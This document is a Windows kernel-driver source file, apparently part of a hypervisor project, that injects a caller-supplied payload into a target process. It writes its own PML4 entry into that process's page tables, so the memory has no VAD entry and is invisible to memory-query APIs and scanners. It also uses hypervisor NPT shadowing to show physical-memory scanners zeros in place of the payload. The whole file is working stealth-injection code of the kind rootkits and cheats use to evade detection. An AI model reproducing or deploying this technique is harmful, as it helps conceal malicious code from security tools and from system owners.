// pml4inject.cpp — included as part of SimpleSvm.cpp single-TU build.
// Do NOT compile this file directly; it relies on symbols already defined
// earlier in SimpleSvm.cpp (RegisterNptShadowPage, <intrin.h>, etc.).
#include "Svmkm.hpp"
#include <intrin.h>

// Forward declaration — EmitJumpStub is defined in Ptehook.cpp which is
// included into the same TU before this file.  The declaration lets the
// compiler see the signature regardless of where RegisterNptShadowPage
// ends up being placed within the translation unit.
static VOID EmitJumpStub(PUCHAR dest, UINT64 targetAddr);

// ============================================================
//  PML4 Page Table Injection
//
//  Technique: allocate physically resident (non-paged, non-swappable) pages
//  to back a full VA range. Build a minimal PML4E→PDPT→PD→PT chain in those
//  pages. Write that PML4E directly into the target process's physical PML4
//  at a free slot not used by Windows. The resulting VA is valid in the
//  target process but has no VAD entry — invisible to NtQueryVirtualMemory,
//  VirtualQueryEx, and scanner tools that walk the VAD tree.
//
//  The hypervisor protects the backing physical pages via NPT shadow paging
//  (RegisterNptShadowPage) so physical memory scanners see only NOPs.
//
//  Lifetime: the backing allocation is tracked in g_Pml4Injections and
//  must be cleaned up (PML4E zeroed, memory freed) before process exit or
//  a MEMORY_MANAGEMENT bugcheck will occur.
// ============================================================

// Maximum simultaneous injections tracked
#define MAX_PML4_INJECTIONS     16

// Page table entry flags for user-mode RWX identity-style entries
#define PTE_PRESENT     (1ULL << 0)
#define PTE_WRITE       (1ULL << 1)
#define PTE_USER        (1ULL << 2)

// One contiguous allocation block that backs an injected PML4 slot.
// Layout in the single MmAllocateContiguousMemory block:
//   [0]          = 512-entry PDPT    (1 page)
//   [1]          = 512-entry PD      (1 page, one PD for the single PDPT slot used)
//   [2]          = 512-entry PT      (1 page, one PT for the single PD slot used)
//   [3 .. 3+N-1] = N payload pages
typedef struct _PML4_INJECTION_RECORD
{
    PVOID     BackingVA;        // VA of contiguous allocation (PDPT base)
    ULONG64   BackingPA;        // PA of same
    SIZE_T     BackingSize;     // total bytes allocated
    ULONG64   TargetCR3;        // physical PML4 PA of target process
    ULONG     Pml4Slot;         // which PML4 slot we injected (0–255 user range)
    ULONG64   InjectedVA;       // resulting VA visible in target
    PEPROCESS TargetProcess;    // kept referenced until cleanup
    BOOLEAN   Active;
} PML4_INJECTION_RECORD, * PPML4_INJECTION_RECORD;

static PML4_INJECTION_RECORD g_Pml4Injections[MAX_PML4_INJECTIONS];
static ULONG                 g_Pml4InjectionCount = 0;
static KSPIN_LOCK            g_Pml4Lock;
static BOOLEAN               g_Pml4LockInit = FALSE;

static ULONG_PTR FlushTlbIpi(ULONG_PTR) { __writecr3(__readcr3()); return 0; }

// Read an 8-byte value from a physical address using MmCopyMemory.
static BOOLEAN ReadPhys64(ULONG64 pa, ULONG64* out)
{
    MM_COPY_ADDRESS addr = {};
    addr.PhysicalAddress.QuadPart = (LONGLONG)pa;
    SIZE_T copied = 0;
    return NT_SUCCESS(MmCopyMemory(out, addr, sizeof(ULONG64),
        MM_COPY_MEMORY_PHYSICAL, &copied))
        && copied == sizeof(ULONG64);
}

// Write an 8-byte value to a kernel VA that maps to a physical page we own.
// We use RtlCopyMemory directly since we own the VA.
static void WritePhysViaVA(PVOID va, ULONG64 value)
{
    RtlCopyMemory(va, &value, sizeof(ULONG64));
}

// Find a free PML4 slot in the user-mode half of the target process.
// User-mode PML4 slots: 0–255 (VA bits [47:39]).
// We read each slot's PML4E via physical memory; a zero entry is free.
static BOOLEAN FindFreePml4Slot(ULONG64 pml4PA, ULONG* slotOut)
{
    // Avoid slots 0 (null page region) and start from a random-ish high slot
    // to make the injected VA look less like a low user-mode allocation.
    // Walk from 100 downward through the user half (0–255).
    for (ULONG slot = 200; slot >= 10; slot--)
    {
        ULONG64 entryPA = pml4PA + (ULONG64)slot * 8;
        ULONG64 pml4e = 0;
        if (!ReadPhys64(entryPA, &pml4e))
            continue;
        if ((pml4e & PTE_PRESENT) == 0) {
            *slotOut = slot;
            return TRUE;
        }
    }
    return FALSE;
}

namespace request
{
    // ----------------------------------------------------------------
    //  pml4_inject
    //
    //  Allocates physically resident pages, builds a 3-level page table
    //  chain (PDPT/PD/PT) pointing at the payload pages, injects a PML4E
    //  into the target process's physical PML4, and copies the caller's
    //  payload into the backing pages.
    //
    //  Returns STATUS_SUCCESS with injected_va filled in on success.
    // ----------------------------------------------------------------
    NTSTATUS pml4_inject(invoke_data* request)
    {
        pml4_inject_invoke data = {};
        if (!modules::safe_copy(&data, request->data, sizeof(pml4_inject_invoke)))
            return STATUS_INVALID_PARAMETER;

        if (!data.target_pid || !data.payload_buffer || !data.payload_size)
            return STATUS_INVALID_PARAMETER;

        if (g_Pml4InjectionCount >= MAX_PML4_INJECTIONS)
            return STATUS_INSUFFICIENT_RESOURCES;

        if (!g_Pml4LockInit) {
            KeInitializeSpinLock(&g_Pml4Lock);
            g_Pml4LockInit = TRUE;
        }

        // Round payload size up to page granularity
        ULONG pageCount = (ULONG)((data.payload_size + PAGE_SIZE - 1) / PAGE_SIZE);
        if (pageCount == 0 || pageCount > 512)
            return STATUS_INVALID_PARAMETER;

        // Resolve target EPROCESS
        PEPROCESS targetProc = NULL;
        NTSTATUS status = PsLookupProcessByProcessId((HANDLE)data.target_pid, &targetProc);
        if (!NT_SUCCESS(status))
            return status;

        // Get target CR3 (physical PML4 base)
        // DirectoryTableBase is at a well-known offset; use MmGetPhysicalAddress
        // on the PML4 array the kernel uses for this process.
        ULONG64 targetCR3 = 0;
        {
            // Attach briefly to read KPROCESS.DirectoryTableBase
            KAPC_STATE apcState = {};
            KeStackAttachProcess(targetProc, &apcState);
            targetCR3 = __readcr3() & ~(ULONG64)0xFFF;
            KeUnstackDetachProcess(&apcState);
        }

        if (!targetCR3) {
            ObDereferenceObject(targetProc);
            return STATUS_UNSUCCESSFUL;
        }

        // Total backing: 1 PDPT page + 1 PD page + 1 PT page + N payload pages
        SIZE_T totalPages = 3 + pageCount;
        SIZE_T totalSize = totalPages * PAGE_SIZE;

        PHYSICAL_ADDRESS low = {}, high = {}, align = {};
        high.QuadPart = (LONGLONG)-1;
        align.QuadPart = PAGE_SIZE;

        PVOID backingVA = MmAllocateContiguousNodeMemory(
            totalSize, low, high, align, PAGE_READWRITE, MM_ANY_NODE_OK);
        if (!backingVA) {
            ObDereferenceObject(targetProc);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        RtlZeroMemory(backingVA, totalSize);

        ULONG64 backingPA = (ULONG64)MmGetPhysicalAddress(backingVA).QuadPart;

        // Page layout (each at PAGE_SIZE offsets):
        //   [0] PDPT   PA = backingPA + 0*PAGE_SIZE
        //   [1] PD     PA = backingPA + 1*PAGE_SIZE
        //   [2] PT     PA = backingPA + 2*PAGE_SIZE
        //   [3..3+N-1] payload pages
        PULONG64 pdptVA = (PULONG64)((PUCHAR)backingVA + 0 * PAGE_SIZE);
        PULONG64 pdVA = (PULONG64)((PUCHAR)backingVA + 1 * PAGE_SIZE);
        PULONG64 ptVA = (PULONG64)((PUCHAR)backingVA + 2 * PAGE_SIZE);
        PVOID    payloadVA = (PUCHAR)backingVA + 3 * PAGE_SIZE;

        ULONG64 pdptPA = backingPA + 0 * PAGE_SIZE;
        ULONG64 pdPA = backingPA + 1 * PAGE_SIZE;
        ULONG64 ptPA = backingPA + 2 * PAGE_SIZE;

        // Find a free PML4 slot in the target
        ULONG pml4Slot = 0;
        if (!FindFreePml4Slot(targetCR3, &pml4Slot)) {
            MmFreeContiguousMemory(backingVA);
            ObDereferenceObject(targetProc);
            return STATUS_CONFLICTING_ADDRESSES;
        }

        // The injected VA is determined entirely by the PML4 slot.
        // Bits [47:39] = pml4Slot, lower bits all zero → start of that 512GB region.
        // We use PDPT slot 0, PD slot 0, PT slot 0 → page offset 0.
        ULONG64 injectedVA = (ULONG64)pml4Slot << 39;

        // Build PT: each entry points at the corresponding payload page
        for (ULONG i = 0; i < pageCount; i++) {
            ULONG64 pagePA = backingPA + (3 + i) * PAGE_SIZE;
            ptVA[i] = (pagePA & ~(ULONG64)0xFFF) | PTE_PRESENT | PTE_WRITE | PTE_USER;
        }

        // Build PD: slot 0 → PT
        pdVA[0] = (ptPA & ~(ULONG64)0xFFF) | PTE_PRESENT | PTE_WRITE | PTE_USER;

        // Build PDPT: slot 0 → PD
        pdptVA[0] = (pdPA & ~(ULONG64)0xFFF) | PTE_PRESENT | PTE_WRITE | PTE_USER;

        // Copy payload into backing payload pages
        SIZE_T copySize = min(data.payload_size, (SIZE_T)pageCount * PAGE_SIZE);
        __try {
            RtlCopyMemory(payloadVA, (PVOID)data.payload_buffer, copySize);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            MmFreeContiguousMemory(backingVA);
            ObDereferenceObject(targetProc);
            return STATUS_ACCESS_VIOLATION;
        }

        // Inject PML4E into target's physical PML4.
        // We get a kernel VA for the target's physical PML4 page via
        // MmGetVirtualForPhysical so we can write directly.
        PHYSICAL_ADDRESS pml4PhysAddr;
        pml4PhysAddr.QuadPart = (LONGLONG)targetCR3;
        PVOID pml4KernelVA = MmGetVirtualForPhysical(pml4PhysAddr);
        if (!pml4KernelVA) {
            // Fallback: use physical write via our existing translate path
            // Map the physical page ourselves temporarily
            MmFreeContiguousMemory(backingVA);
            ObDereferenceObject(targetProc);
            return STATUS_UNSUCCESSFUL;
        }

        PULONG64 pml4Array = (PULONG64)pml4KernelVA;
        ULONG64 newPml4e = (pdptPA & ~(ULONG64)0xFFF) | PTE_PRESENT | PTE_WRITE | PTE_USER;

        // Atomic write — CR3 may be active on another processor
        InterlockedExchange64((LONGLONG*)&pml4Array[pml4Slot], (LONGLONG)newPml4e);

        // Register backing payload pages with the NPT shadow system so
        // physical memory scanners see NOPs, not the injected code.
        for (ULONG i = 0; i < pageCount; i++) {
            PVOID pageVA = (PVOID)((PUCHAR)payloadVA + i * PAGE_SIZE);
            RegisterNptShadowPage(pageVA, 0); // 0 = stealth-only: exec=payload, decoy=zeros
        }

        // Track this injection for later cleanup
        KIRQL oldIrql;
        KeAcquireSpinLock(&g_Pml4Lock, &oldIrql);
        if (g_Pml4InjectionCount < MAX_PML4_INJECTIONS) {
            PPML4_INJECTION_RECORD rec = &g_Pml4Injections[g_Pml4InjectionCount++];
            rec->BackingVA = backingVA;
            rec->BackingPA = backingPA;
            rec->BackingSize = totalSize;
            rec->TargetCR3 = targetCR3;
            rec->Pml4Slot = pml4Slot;
            rec->InjectedVA = injectedVA;
            rec->TargetProcess = targetProc;   // reference held
            rec->Active = TRUE;
        }
        KeReleaseSpinLock(&g_Pml4Lock, oldIrql);

        // Write back the injected VA to the caller's invoke struct
        reinterpret_cast<pml4_inject_invoke*>(request->data)->injected_va = injectedVA;

        DbgPrint("[pml4inject] pid=%llu slot=%lu injectedVA=%016llX pdptPA=%016llX\n",
            data.target_pid, pml4Slot, injectedVA, pdptPA);

        return STATUS_SUCCESS;
    }

    // ----------------------------------------------------------------
    //  CleanupPml4Injection — zero the PML4E and free backing memory.
    //  Must be called before the target process exits.
    // ----------------------------------------------------------------
    VOID CleanupAllPml4Injections()
    {
        if (!g_Pml4LockInit)
            return;

        KIRQL oldIrql;
        KeAcquireSpinLock(&g_Pml4Lock, &oldIrql);

        for (ULONG i = 0; i < g_Pml4InjectionCount; i++) {
            PPML4_INJECTION_RECORD rec = &g_Pml4Injections[i];
            if (!rec->Active)
                continue;

            // Zero the PML4E so the MMU stops seeing it
            PHYSICAL_ADDRESS pml4PhysAddr;
            pml4PhysAddr.QuadPart = (LONGLONG)rec->TargetCR3;
            PVOID pml4KernelVA = MmGetVirtualForPhysical(pml4PhysAddr);
            if (pml4KernelVA) {
                PULONG64 pml4Array = (PULONG64)pml4KernelVA;
                InterlockedExchange64((LONGLONG*)&pml4Array[rec->Pml4Slot], 0LL);
            }

            // Flush all CPUs' TLBs — KeFlushEntireTb or IPI if available,
            // here we use the safe portable approach of writing CR3 on each
            // processor via an IPI (the hypervisor INVLPG intercept already
            // flushes the NPT ASID TLB on our side).
            KeIpiGenericCall(FlushTlbIpi, 0);

            MmFreeContiguousMemory(rec->BackingVA);
            ObDereferenceObject(rec->TargetProcess);
            rec->Active = FALSE;
        }

        KeReleaseSpinLock(&g_Pml4Lock, oldIrql);
    }
}